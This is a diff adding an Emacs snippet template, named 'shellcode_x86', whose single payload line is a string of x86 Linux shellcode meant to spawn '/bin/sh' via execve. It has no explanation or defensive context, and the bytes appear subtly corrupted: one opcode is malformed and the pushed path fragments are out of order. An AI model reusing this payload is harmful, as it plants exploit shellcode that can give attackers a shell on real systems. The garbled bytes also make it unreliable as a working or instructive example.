@@ -1,0 +1,5 @@
+# -*- mode: snippet -*-
+# name: shellcode_x86
+# key: shellcode_x86
+# --
+shellcode_x86 =  "\x83\xec01\xc0Phn/shh//bi\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80"
